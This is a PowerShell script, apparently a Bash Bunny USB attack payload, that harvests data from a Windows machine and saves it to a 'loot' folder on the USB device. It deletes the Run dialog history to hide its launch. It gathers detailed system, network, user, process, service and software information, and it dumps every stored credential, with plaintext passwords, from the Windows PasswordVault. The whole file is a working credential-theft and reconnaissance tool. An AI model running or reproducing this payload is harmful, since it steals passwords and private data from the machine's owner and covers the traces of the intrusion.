#Remove run history
powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"

#Set Default Encoding
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

#Get the path and file name that you are using for output
# find connected bashbunny drive:
$VolumeName = "bashbunny"
$computerSystem = Get-CimInstance CIM_ComputerSystem
$backupDrive = $null
get-wmiobject win32_logicaldisk | % {
    if ($_.VolumeName -eq $VolumeName) {
        $backupDrive = $_.DeviceID
    }
}

#See if a info folder exist in loot folder. If not create one
$TARGETDIR = $backupDrive + "\loot\info\" + $computerSystem.Name 
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

$datetime = get-date -f yyyy-MM-dd_HH-mm
#Set Bash Bunny as Target Directory
$backupPath = $TARGETDIR + "\"
 
 
#Set Username
$Username = $env:USERNAME

#Get info about pc

# Get IP / Nework Info
try
{
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
}
catch
{
$computerPubIP="Error getting Public IP"
}
$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
$IsDHCPEnabled = $false
$Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
foreach ($Network in $Networks) {
If($network.DHCPEnabled) {
$IsDHCPEnabled = $true
  }
[string[]]$computerMAC =$Network.MACAddress
}

#Get System Info
$computerSystem = Get-CimInstance CIM_ComputerSystem 
$computerBIOS = Get-CimInstance CIM_BIOSElement

$computerOs=Get-WmiObject win32_operatingsystem | Select-Object Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List | Out-String | ForEach-Object { $_.Trim() }
$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed  | Out-String | ForEach-Object { $_.Trim() }
$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List | Out-String | ForEach-Object { $_.Trim() }

$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)} | Out-String | ForEach-Object { $_.Trim() }
$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table | Out-String | ForEach-Object { $_.Trim() }

# Get HDDs
$driveType = @{
   2="Removable disk "
   3="Fixed local disk "
   4="Network disk "
   5="Compact disk "}
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table -AutoSize DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber ,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }

#Get - Com & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String | ForEach-Object { $_.Trim() }

# Check RDP
$RDP
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	$RDP = "RDP is Enabled" 
} else {
	$RDP = "RDP is NOT enabled" 
}

# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -Width 1000| ForEach-Object { $_.Trim() }


# local-user
$luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String -Width 1200 | ForEach-Object { $_.Trim() }

# process first
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Format-Table -AutoSize| Out-String -Width 1200 | ForEach-Object { $_.Trim() }

# Get Listeners / ActiveTcpConnections
$listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
      "LocalAddress" = $listenerItem.LocalAddress
      "RemoteAddress" = $listenerItem.RemoteAddress
      "State" = $listenerItem.State
      "AppliedSetting" = $listenerItem.AppliedSetting
      "OwningProcess" = $listenerItem.OwningProcess
      "ProcessName" = $processItem.ProcessName
    }
} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String | ForEach-Object { $_.Trim() }

# process last
$process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Format-Table -AutoSize | Out-String -Width 1200 | ForEach-Object { $_.Trim() }

# service
$service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName -AutoSize | out-string -Width 1000| ForEach-Object { $_.Trim() }

# installed software (get uninstaller)
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName| out-string -Width 1000 | ForEach-Object { $_.Trim() }
#$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName| Out-String | ForEach-Object { $_.Trim() }

# drivers
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String | ForEach-Object { $_.Trim() }

# videocard
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String | ForEach-Object { $_.Trim() }

#Get stored passwords
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault 
$vault = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }

#Get USB Devices used
$UsbUsed = (Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR\*\* |Select FriendlyName | out-string).Trim()

#The output
Clear-Host


$computerSystem.Name >> $backupPath"Computer.txt"
#"Manufacturer: " + 
$computerSystem.Manufacturer >> $backupPath"Computer.txt"
#"Model: " + 
$computerSystem.Model >> $backupPath"Computer.txt"
#"Serial Number: " + 
$computerBIOS.SerialNumber >> $backupPath"Computer.txt"


#New-Object 

#Operating System
(Write-Output $computerOs) > $backupPath"Operating System.txt"

#CPU Info
(Write-Output $computerCpu) > $backupPath"CPU.txt"

#RAM capacity
Write-Output ("RAM: "+$computerRamCapacity+ "`n"+($computerRam)) > $backupPath"RAM.txt"

#Main Board
(Write-Output $computerMainboard) > $backupPath"Mainboard.txt"

#BIOS
Write-Output (Get-WmiObject win32_bios | Out-String).Trim() > $backupPath"Bios.txt"

#Local User
Write-Output ($luser) > $backupPath"Local-User.txt"

#Hard Disk
Write-Output ($Hdds| Out-String).Trim() > $backupPath"Hard Disk.txt"

#COM and Serial Devices
Write-Output ($COMDevices) > $backupPath"COM & Serial Devices.txt"

#Network Info
Write-Output ("Computers MAC address: " + $computerMAC)  >> $backupPath"Network.txt"
Write-Output ("Computers IP address: " + $computerIP.ipaddress[0])  >> $backupPath"Network.txt"
Write-Output ("Public IP address: " + $computerPubIP  ) >> $backupPath"Network.txt"
Write-Output ("RDP: " + $RDP) >> $backupPath"Network.txt"

(Write-Output $Network) >> $backupPath"Network.txt"


#Listeners/Active TCP Connections
(Write-Output $listener) >> $backupPath"Listeners and Active TCP Connections.txt"

#Current Running Processes
(Write-Output $process) >> $backupPath"Running Processes.txt"

#Services
(Write-Output $service) >> $backupPath"Services.txt"

#Installed Software
(Write-Output $software) >> $backupPath"Installed Software.txt"

#Installed Drivers
(Write-Output $drivers) >> $backupPath"Installed Drivers.txt"

#Installed Videocards
(Write-Output $videocard |out-string).Trim() >> $backupPath"Installed Videocards.txt"

#Windows/user passwords
$vault | select Resource, UserName, Password | Sort-Object Resource | ft -AutoSize | Out-String | ForEach-Object { $_.Trim() } >> $backupPath"Windows User Passwords.txt"

#USB 
$Usbused | Out-File -FilePath $backupPath"USB History.txt"

Remove-Variable -Name computerPubIP,
computerIP,IsDHCPEnabled,Network,Networks, 
computerMAC,computerSystem,computerBIOS,computerOs,
computerCpu, computerMainboard,computerRamCapacity,
computerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,
Output,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,
process,listener,listenerItem,process,service,software,drivers,videocard,UsbUsed,
vault -ErrorAction SilentlyContinue -Force